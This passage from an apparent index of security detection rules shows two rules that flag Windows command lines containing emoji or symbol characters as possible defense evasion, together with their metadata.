evt.Parsed.CommandLine contains '\ud83d\uddc3' || evt.Parsed.CommandLine contains '\ud83d\uddf3' || evt.Parsed.CommandLine contains '\ud83d\uddc4' || evt.Parsed.CommandLine contains '\ud83d\udccb' || evt.Parsed.CommandLine contains '\ud83d\udcc1' || evt.Parsed.CommandLine contains '\ud83d\udcc2' || evt.Parsed.CommandLine contains '\ud83d\uddc2' || evt.Parsed.CommandLine contains '\ud83d\uddde' || evt.Parsed.CommandLine contains '\ud83d\udcf0' || evt.Parsed.CommandLine contains '\ud83d\udcd3' || evt.Parsed.CommandLine contains '\ud83d\udcd4' || evt.Parsed.CommandLine contains '\ud83d\udcd2' || evt.Parsed.CommandLine contains '\ud83d\udcd5' || evt.Parsed.CommandLine contains '\ud83d\udcd7' || evt.Parsed.CommandLine contains '\ud83d\udcd8' || evt.Parsed.CommandLine contains '\ud83d\udcd9' || evt.Parsed.CommandLine contains '\ud83d\udcda' || evt.Parsed.CommandLine contains '\ud83d\udcd6' || evt.Parsed.CommandLine contains '\ud83d\udd16' || evt.Parsed.CommandLine contains '\ud83e\uddf7' || evt.Parsed.CommandLine contains '\ud83d\udd17' || evt.Parsed.CommandLine contains '\ud83d\udcce' || evt.Parsed.CommandLine contains '\ud83d\udd87' || evt.Parsed.CommandLine contains '\ud83d\udcd0' || evt.Parsed.CommandLine contains '\ud83d\udccf' || evt.Parsed.CommandLine contains '\ud83e\uddee' || evt.Parsed.CommandLine contains '\ud83d\udccc' || evt.Parsed.CommandLine contains '\ud83d\udccd' || evt.Parsed.CommandLine contains '\u2702\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd8a' || evt.Parsed.CommandLine contains '\ud83d\udd8b' || evt.Parsed.CommandLine contains '\u2712\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd8c' || evt.Parsed.CommandLine contains '\ud83d\udd8d' || evt.Parsed.CommandLine contains '\ud83d\udcdd' || evt.Parsed.CommandLine contains '\u270f\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd0d' || evt.Parsed.CommandLine contains '\ud83d\udd0e' || evt.Parsed.CommandLine contains '\ud83d\udd0f' || evt.Parsed.CommandLine contains '\ud83d\udd10' || evt.Parsed.CommandLine contains '\ud83d\udd12' || evt.Parsed.CommandLine contains '\ud83d\udd13\u2764\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udde1' || evt.Parsed.CommandLine contains '\ud83d\udc9b' || evt.Parsed.CommandLine contains '\ud83d\udc9a' || evt.Parsed.CommandLine contains '\ud83d\udc99' || evt.Parsed.CommandLine contains '\ud83d\udc9c' || evt.Parsed.CommandLine contains '\ud83d\udda4' || evt.Parsed.CommandLine contains '\ud83e\udd0d' || evt.Parsed.CommandLine contains '\ud83e\udd0e' || evt.Parsed.CommandLine contains '\u2764\ufe0f\u200d\ud83d\udd25' || evt.Parsed.CommandLine contains '\u2764\ufe0f\u200d\ud83e\ude79' || evt.Parsed.CommandLine contains '\ud83d\udc94' || evt.Parsed.CommandLine contains '\u2763\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc95' || evt.Parsed.CommandLine contains '\ud83d\udc9e' || evt.Parsed.CommandLine contains '\ud83d\udc93' || evt.Parsed.CommandLine contains '\ud83d\udc97' || evt.Parsed.CommandLine contains '\ud83d\udc96' || evt.Parsed.CommandLine contains '\ud83d\udc98' || evt.Parsed.CommandLine contains '\ud83d\udc9d' || evt.Parsed.CommandLine contains '\ud83d\udc9f' || evt.Parsed.CommandLine contains '\u262e\ufe0f' || evt.Parsed.CommandLine contains '\u271d\ufe0f' || evt.Parsed.CommandLine contains '\u262a\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd49' || evt.Parsed.CommandLine contains '\u2638\ufe0f' || evt.Parsed.CommandLine contains '\u2721\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd2f' || evt.Parsed.CommandLine contains '\ud83d\udd4e' || evt.Parsed.CommandLine contains '\u262f\ufe0f' || evt.Parsed.CommandLine contains '\u2626\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\uded0' || evt.Parsed.CommandLine contains '\u26ce' || evt.Parsed.CommandLine contains '\u2648\ufe0f' || evt.Parsed.CommandLine contains '\u2649\ufe0f' || evt.Parsed.CommandLine contains '\u264a\ufe0f' || evt.Parsed.CommandLine contains '\u264b\ufe0f' || evt.Parsed.CommandLine contains '\u264c\ufe0f' || evt.Parsed.CommandLine contains '\u264d\ufe0f' || evt.Parsed.CommandLine contains '\u264e\ufe0f' || evt.Parsed.CommandLine contains '\u264f\ufe0f' || evt.Parsed.CommandLine contains '\u2650\ufe0f' || evt.Parsed.CommandLine contains '\u2651\ufe0f' || evt.Parsed.CommandLine contains '\u2652\ufe0f' || evt.Parsed.CommandLine contains '\u2653\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd94' || evt.Parsed.CommandLine contains '\u269b\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\ude51' || evt.Parsed.CommandLine contains '\u2622\ufe0f' || evt.Parsed.CommandLine contains '\u2623\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcf4' || evt.Parsed.CommandLine contains '\ud83d\udcf3' || evt.Parsed.CommandLine contains '\ud83c\ude36' || evt.Parsed.CommandLine contains '\ud83c\ude1a\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\ude38' || evt.Parsed.CommandLine contains '\ud83c\ude3a' || evt.Parsed.CommandLine contains '\ud83c\ude37\ufe0f' || evt.Parsed.CommandLine contains '\u2734\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd9a' || evt.Parsed.CommandLine contains '\ud83d\udcae' || evt.Parsed.CommandLine contains '\ud83c\ude50' || evt.Parsed.CommandLine contains '\u3299\ufe0f' || evt.Parsed.CommandLine contains '\u3297\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\ude34' || evt.Parsed.CommandLine contains '\ud83c\ude35' || evt.Parsed.CommandLine contains '\ud83c\ude39' || evt.Parsed.CommandLine contains '\ud83c\ude32' || evt.Parsed.CommandLine contains '\ud83c\udd70\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd71\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd8e' || evt.Parsed.CommandLine contains '\ud83c\udd91' || evt.Parsed.CommandLine contains '\ud83c\udd7e\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd98' || evt.Parsed.CommandLine contains '\u274c' || evt.Parsed.CommandLine contains '\u2b55\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\uded1' || evt.Parsed.CommandLine contains '\u26d4\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcdb' || evt.Parsed.CommandLine contains '\ud83d\udeab' || evt.Parsed.CommandLine contains '\ud83d\udcaf' || evt.Parsed.CommandLine contains '\ud83d\udca2' || evt.Parsed.CommandLine contains '\u2668\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb7' || evt.Parsed.CommandLine contains '\ud83d\udeaf' || evt.Parsed.CommandLine contains '\ud83d\udeb3' || evt.Parsed.CommandLine contains '\ud83d\udeb1' || evt.Parsed.CommandLine contains '\ud83d\udd1e' || evt.Parsed.CommandLine contains '\ud83d\udcf5' || evt.Parsed.CommandLine contains '\ud83d\udead' || evt.Parsed.CommandLine contains '\u2757\ufe0f' || evt.Parsed.CommandLine contains '\u2755' || evt.Parsed.CommandLine contains '\u2753' || evt.Parsed.CommandLine contains '\u2754' || evt.Parsed.CommandLine contains '\u203c\ufe0f' || evt.Parsed.CommandLine contains '\u2049\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd05' || evt.Parsed.CommandLine contains '\ud83d\udd06' || evt.Parsed.CommandLine contains '\u303d\ufe0f' || evt.Parsed.CommandLine contains '\u26a0\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb8' || evt.Parsed.CommandLine contains '\ud83d\udd31' || evt.Parsed.CommandLine contains '\u269c\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd30' || evt.Parsed.CommandLine contains '\u267b\ufe0f' || evt.Parsed.CommandLine contains '\u2705' || evt.Parsed.CommandLine contains '\ud83c\ude2f\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcb9' || evt.Parsed.CommandLine contains '\u2747\ufe0f' || evt.Parsed.CommandLine contains '\u2733\ufe0f' || evt.Parsed.CommandLine contains '\u274e' || evt.Parsed.CommandLine contains '\ud83c\udf10' || evt.Parsed.CommandLine contains '\ud83d\udca0' || evt.Parsed.CommandLine contains '\u24c2\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf00' || evt.Parsed.CommandLine contains '\ud83d\udca4' || evt.Parsed.CommandLine contains '\ud83c\udfe7' || evt.Parsed.CommandLine contains '\ud83d\udebe' || evt.Parsed.CommandLine contains '\u267f\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udd7f\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\uded7' || evt.Parsed.CommandLine contains '\ud83c\ude33' || evt.Parsed.CommandLine contains '\ud83c\ude02\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec2' || evt.Parsed.CommandLine contains '\ud83d\udec3' || evt.Parsed.CommandLine contains '\ud83d\udec4' || evt.Parsed.CommandLine contains '\ud83d\udec5' || evt.Parsed.CommandLine contains '\ud83d\udeb9' || evt.Parsed.CommandLine contains '\ud83d\udeba' || evt.Parsed.CommandLine contains '\ud83d\udebc' || evt.Parsed.CommandLine contains '\u26a7' || evt.Parsed.CommandLine contains '\ud83d\udebb' || evt.Parsed.CommandLine contains '\ud83d\udeae' || evt.Parsed.CommandLine contains '\ud83c\udfa6' || evt.Parsed.CommandLine contains '\ud83d\udcf6' || evt.Parsed.CommandLine contains '\ud83c\ude01' || evt.Parsed.CommandLine contains '\ud83d\udd23' || evt.Parsed.CommandLine contains '\u2139\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd24' || evt.Parsed.CommandLine contains '\ud83d\udd21' || evt.Parsed.CommandLine contains '\ud83d\udd20' || evt.Parsed.CommandLine contains '\ud83c\udd96' || evt.Parsed.CommandLine contains '\ud83c\udd97' || evt.Parsed.CommandLine contains '\ud83c\udd99' || evt.Parsed.CommandLine contains '\ud83c\udd92' || evt.Parsed.CommandLine contains '\ud83c\udd95' || evt.Parsed.CommandLine contains '\ud83c\udd93' || evt.Parsed.CommandLine contains '0\ufe0f\u20e3' || evt.Parsed.CommandLine contains '1\ufe0f\u20e3' || evt.Parsed.CommandLine contains '2\ufe0f\u20e3' || evt.Parsed.CommandLine contains '3\ufe0f\u20e3' || evt.Parsed.CommandLine contains '4\ufe0f\u20e3' || evt.Parsed.CommandLine contains '5\ufe0f\u20e3' || evt.Parsed.CommandLine contains '6\ufe0f\u20e3' || evt.Parsed.CommandLine contains '7\ufe0f\u20e3' || evt.Parsed.CommandLine contains '8\ufe0f\u20e3' || evt.Parsed.CommandLine contains '9\ufe0f\u20e3' || evt.Parsed.CommandLine contains '\ud83d\udd1f' || evt.Parsed.CommandLine contains '\ud83d\udd22' || evt.Parsed.CommandLine contains '#\ufe0f\u20e3' || evt.Parsed.CommandLine contains '\ufe0f\u20e3' || evt.Parsed.CommandLine contains '\u23cf\ufe0f' || evt.Parsed.CommandLine contains '\u25b6\ufe0f' || evt.Parsed.CommandLine contains '\u23f8' || evt.Parsed.CommandLine contains '\u23ef' || evt.Parsed.CommandLine contains '\u23f9' || evt.Parsed.CommandLine contains '\u23fa' || evt.Parsed.CommandLine contains '\u23ed' || evt.Parsed.CommandLine contains '\u23ee' || evt.Parsed.CommandLine contains '\u23e9' || evt.Parsed.CommandLine contains '\u23ea' || evt.Parsed.CommandLine contains '\u23eb' || evt.Parsed.CommandLine contains '\u23ec' || evt.Parsed.CommandLine contains '\u25c0\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd3c' || evt.Parsed.CommandLine contains '\ud83d\udd3d' || evt.Parsed.CommandLine contains '\u27a1\ufe0f' || evt.Parsed.CommandLine contains '\u2b05\ufe0f' || evt.Parsed.CommandLine contains '\u2b06\ufe0f' || evt.Parsed.CommandLine contains '\u2b07\ufe0f' || evt.Parsed.CommandLine contains '\u2197\ufe0f' || evt.Parsed.CommandLine contains '\u2198\ufe0f' || evt.Parsed.CommandLine contains '\u2199\ufe0f' || evt.Parsed.CommandLine contains '\u2196\ufe0f' || evt.Parsed.CommandLine contains '\u2195\ufe0f' || evt.Parsed.CommandLine contains '\u2194\ufe0f' || evt.Parsed.CommandLine contains '\u21aa\ufe0f' || evt.Parsed.CommandLine contains '\u21a9\ufe0f' || evt.Parsed.CommandLine contains '\u2934\ufe0f' || evt.Parsed.CommandLine contains '\u2935\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd00' || evt.Parsed.CommandLine contains '\ud83d\udd01' || evt.Parsed.CommandLine contains '\ud83d\udd02' || evt.Parsed.CommandLine contains '\ud83d\udd04' || evt.Parsed.CommandLine contains '\ud83d\udd03' || evt.Parsed.CommandLine contains '\ud83c\udfb5' || evt.Parsed.CommandLine contains '\ud83c\udfb6' || evt.Parsed.CommandLine contains '\u2795' || evt.Parsed.CommandLine contains '\u2796' || evt.Parsed.CommandLine contains '\u2797' || evt.Parsed.CommandLine contains '\u2716\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udff0' || evt.Parsed.CommandLine contains '\u267e' || evt.Parsed.CommandLine contains '\ud83d\udcb2' || evt.Parsed.CommandLine contains '\ud83d\udcb1' || evt.Parsed.CommandLine contains '\u2122\ufe0f' || evt.Parsed.CommandLine contains '\u00a9\ufe0f' || evt.Parsed.CommandLine contains '\u00ae\ufe0f' || evt.Parsed.CommandLine contains '\u3030\ufe0f' || evt.Parsed.CommandLine contains '\u27b0' || evt.Parsed.CommandLine contains '\u27bf' || evt.Parsed.CommandLine contains '\ud83d\udd1a' || evt.Parsed.CommandLine contains '\ud83d\udd19' || evt.Parsed.CommandLine contains '\ud83d\udd1b' || evt.Parsed.CommandLine contains '\ud83d\udd1d' || evt.Parsed.CommandLine contains '\ud83d\udd1c' || evt.Parsed.CommandLine contains '\u2714\ufe0f' || evt.Parsed.CommandLine contains '\u2611\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd18' || evt.Parsed.CommandLine contains '\ud83d\udd34' || evt.Parsed.CommandLine contains '\ud83d\udfe0' || evt.Parsed.CommandLine contains '\ud83d\udfe1' || evt.Parsed.CommandLine contains '\ud83d\udfe2' || evt.Parsed.CommandLine contains '\ud83d\udd35' || evt.Parsed.CommandLine contains '\ud83d\udfe3' || evt.Parsed.CommandLine contains '\u26ab\ufe0f' || evt.Parsed.CommandLine contains '\u26aa\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udfe4' || evt.Parsed.CommandLine contains '\ud83d\udd3a' || evt.Parsed.CommandLine contains '\ud83d\udd3b')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 3\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_emoji_usage_in_cli_3.yml", "version": "0.2", "versions": {"0.1": {"digest": "64341514d81d6abbfc0c6165e5f4180c8b5e5f746af110034cfe2016c3c3a991"}, "0.2": {"digest": "2bb3981bb771660ac27e683d498f682b6f97463640dc905a2a06ca05792373d8"}}}, "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_4": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_emoji_usage_in_cli_4\ndescription: |\n  Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\ud83d\udd38' || evt.Parsed.CommandLine contains '\ud83d\udd39' || evt.Parsed.CommandLine contains '\ud83d\udd36' || evt.Parsed.CommandLine contains '\ud83d\udd37' || evt.Parsed.CommandLine contains '\ud83d\udd33' || evt.Parsed.CommandLine contains '\ud83d\udd32' || evt.Parsed.CommandLine contains '\u25aa\ufe0f' || evt.Parsed.CommandLine contains '\u25ab\ufe0f' || evt.Parsed.CommandLine contains '\u25fe\ufe0f' || evt.Parsed.CommandLine contains '\u25fd\ufe0f' || evt.Parsed.CommandLine contains '\u25fc\ufe0f' || evt.Parsed.CommandLine contains '\u25fb\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udfe5' || evt.Parsed.CommandLine contains '\ud83d\udfe7' || evt.Parsed.CommandLine contains '\ud83d\udfe8' || evt.Parsed.CommandLine contains '\ud83d\udfe9' || evt.Parsed.CommandLine contains '\ud83d\udfe6' || evt.Parsed.CommandLine contains '\ud83d\udfea' || evt.Parsed.CommandLine contains '\u2b1b\ufe0f' || evt.Parsed.CommandLine contains '\u2b1c\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udd08' || evt.Parsed.CommandLine contains '\ud83d\udd07' || evt.Parsed.CommandLine contains '\ud83d\udd09' || evt.Parsed.CommandLine contains '\ud83d\udd0a' || evt.Parsed.CommandLine contains '\ud83d\udd14' || evt.Parsed.CommandLine contains '\ud83d\udd15' || evt.Parsed.CommandLine contains '\ud83d\udce3' || evt.Parsed.CommandLine contains '\ud83d\udce2' || evt.Parsed.CommandLine contains '\ud83d\udc41\u200d\ud83d\udde8' || evt.Parsed.CommandLine contains '\ud83d\udcac' || evt.Parsed.CommandLine contains '\ud83d\udcad' || evt.Parsed.CommandLine contains '\ud83d\uddef' || evt.Parsed.CommandLine contains '\u2660\ufe0f' || evt.Parsed.CommandLine contains '\u2663\ufe0f' || evt.Parsed.CommandLine contains '\u2665\ufe0f' || evt.Parsed.CommandLine contains '\u2666\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udccf' || evt.Parsed.CommandLine contains '\ud83c\udfb4' || evt.Parsed.CommandLine contains '\ud83c\udc04\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd50' || evt.Parsed.CommandLine contains '\ud83d\udd51' || evt.Parsed.CommandLine contains '\ud83d\udd52' || evt.Parsed.CommandLine contains '\ud83d\udd53' || evt.Parsed.CommandLine contains '\ud83d\udd54' || evt.Parsed.CommandLine contains '\ud83d\udd55' || evt.Parsed.CommandLine contains '\ud83d\udd56' || evt.Parsed.CommandLine contains '\ud83d\udd57' || evt.Parsed.CommandLine contains '\ud83d\udd58' || evt.Parsed.CommandLine contains '\ud83d\udd59' || evt.Parsed.CommandLine contains '\ud83d\udd5a' || evt.Parsed.CommandLine contains '\ud83d\udd5b' || evt.Parsed.CommandLine contains '\ud83d\udd5c' || evt.Parsed.CommandLine contains '\ud83d\udd5d' || evt.Parsed.CommandLine contains '\ud83d\udd5e' || evt.Parsed.CommandLine contains '\ud83d\udd5f' || evt.Parsed.CommandLine contains '\ud83d\udd60' || evt.Parsed.CommandLine contains '\ud83d\udd61' || evt.Parsed.CommandLine contains '\ud83d\udd62' || evt.Parsed.CommandLine contains '\ud83d\udd63' || evt.Parsed.CommandLine contains '\ud83d\udd64' || evt.Parsed.CommandLine contains '\ud83d\udd65' || evt.Parsed.CommandLine contains '\ud83d\udd66' || evt.Parsed.CommandLine contains '\ud83d\udd67\u2722' || evt.Parsed.CommandLine contains '\u2723' || evt.Parsed.CommandLine contains '\u2724' || evt.Parsed.CommandLine contains '\u2725' || evt.Parsed.CommandLine contains '\u2726' || evt.Parsed.CommandLine contains '\u2727' || evt.Parsed.CommandLine contains '\u2605' || evt.Parsed.CommandLine contains '\u2606' || evt.Parsed.CommandLine contains '\u272f' || evt.Parsed.CommandLine contains '\u2721\ufe0e' || evt.Parsed.CommandLine contains '\u2729' || evt.Parsed.CommandLine contains '\u272a' || evt.Parsed.CommandLine contains '\u272b' || evt.Parsed.CommandLine contains '\u272c' || evt.Parsed.CommandLine contains '\u272d' || evt.Parsed.CommandLine contains '\u272e' || evt.Parsed.CommandLine contains '\u2736' || evt.Parsed.CommandLine contains '\u2737' || evt.Parsed.CommandLine contains '\u2735' || evt.Parsed.CommandLine contains '\u2738' || evt.Parsed.CommandLine contains '\u2739' || evt.Parsed.CommandLine contains '\u2192' || evt.Parsed.CommandLine contains '\u21d2' || evt.Parsed.CommandLine contains '\u27f9' || evt.Parsed.CommandLine contains '\u21e8' || evt.Parsed.CommandLine contains '\u21fe' || evt.Parsed.CommandLine contains '\u27be' || evt.Parsed.CommandLine contains '\u21e2' || evt.Parsed.CommandLine contains '\u261b' || evt.Parsed.CommandLine contains '\u261e' || evt.Parsed.CommandLine contains '\u2794' || evt.Parsed.CommandLine contains '\u279c' || evt.Parsed.CommandLine contains '\u2799' || evt.Parsed.CommandLine contains '\u279b' || evt.Parsed.CommandLine contains '\u279d' || evt.Parsed.CommandLine contains '\u279e' || evt.Parsed.CommandLine contains '\u2660\ufe0e' || evt.Parsed.CommandLine contains '\u2663\ufe0e' || evt.Parsed.CommandLine contains '\u2665\ufe0e' || evt.Parsed.CommandLine contains '\u2666\ufe0e' || evt.Parsed.CommandLine contains '\u2664' || evt.Parsed.CommandLine contains '\u2667' || evt.Parsed.CommandLine contains '\u2661' || evt.Parsed.CommandLine contains '\u2662' || evt.Parsed.CommandLine contains '\u265a' || evt.Parsed.CommandLine contains '\u265b' || evt.Parsed.CommandLine contains '\u265c' || evt.Parsed.CommandLine contains '\u265d' || evt.Parsed.CommandLine contains '\u265e' || evt.Parsed.CommandLine contains '\u265f' || evt.Parsed.CommandLine contains '\u2654' || evt.Parsed.CommandLine contains '\u2655' || evt.Parsed.CommandLine contains '\u2656' || evt.Parsed.CommandLine contains '\u2657' || evt.Parsed.CommandLine contains '\u2658' || evt.Parsed.CommandLine contains '\u2659' || evt.Parsed.CommandLine contains '\u2680' || evt.Parsed.CommandLine contains '\u2681' || evt.Parsed.CommandLine contains '\u2682' || evt.Parsed.CommandLine contains '\u2683' || evt.Parsed.CommandLine contains '\u2684' || evt.Parsed.CommandLine contains '\u2685' || evt.Parsed.CommandLine contains '\ud83c\udca0' || evt.Parsed.CommandLine contains '\u2688' || evt.Parsed.CommandLine contains '\u2689' || evt.Parsed.CommandLine contains '\u2686' || evt.Parsed.CommandLine contains '\u2687' || evt.Parsed.CommandLine contains '\ud80c\udc00' || evt.Parsed.CommandLine contains '\ud80c\udc01' || evt.Parsed.CommandLine contains '\ud80c\udc02' || evt.Parsed.CommandLine contains '\ud80c\udc03' || evt.Parsed.CommandLine contains '\ud80c\udc04' || evt.Parsed.CommandLine contains '\ud80c\udc05' || evt.Parsed.CommandLine contains '\ud80c\udc06' || evt.Parsed.CommandLine contains '\ud80c\udc07' || evt.Parsed.CommandLine contains '\ud80c\udc08' || evt.Parsed.CommandLine contains '\ud80c\udc09' || evt.Parsed.CommandLine contains '\ud80c\udc0a' || evt.Parsed.CommandLine contains '\ud80c\udc0b' || evt.Parsed.CommandLine contains '\ud80c\udc0c' || evt.Parsed.CommandLine contains '\ud80c\udc0d' || evt.Parsed.CommandLine contains '\ud80c\udc0e' || evt.Parsed.CommandLine contains '\ud80c\udc0f' || evt.Parsed.CommandLine contains '\ud80c\udc10' || evt.Parsed.CommandLine contains '\ud80c\udc11' || evt.Parsed.CommandLine contains '\ud80c\udc12' || evt.Parsed.CommandLine contains '\ud80c\udc13' || evt.Parsed.CommandLine contains '\ud80c\udc14' || evt.Parsed.CommandLine contains '\ud80c\udc15' || evt.Parsed.CommandLine contains '\ud80c\udc16' || evt.Parsed.CommandLine contains '\ud80c\udc17' || evt.Parsed.CommandLine contains '\ud80c\udc18' || evt.Parsed.CommandLine contains '\ud80c\udc19' || evt.Parsed.CommandLine contains '\ud80c\udc1a' || evt.Parsed.CommandLine contains '\ud80c\udc1b' || evt.Parsed.CommandLine contains '\ud80c\udc1c' || evt.Parsed.CommandLine contains '\ud80c\udc1d\ud83c\udff3\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udff4' || evt.Parsed.CommandLine contains '\ud83c\udfc1' || evt.Parsed.CommandLine contains '\ud83d\udea9' || evt.Parsed.CommandLine contains '\ud83c\udff3\ufe0f\u200d\ud83c\udf08' || evt.Parsed.CommandLine contains '\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udff4\u200d\u2620\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddfd' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf6' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\udde7' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddef' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddfb' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf6' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddfd' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\udded\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddef' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddfb' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf6' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\uddf9' || evt.Parsed.CommandLine contains 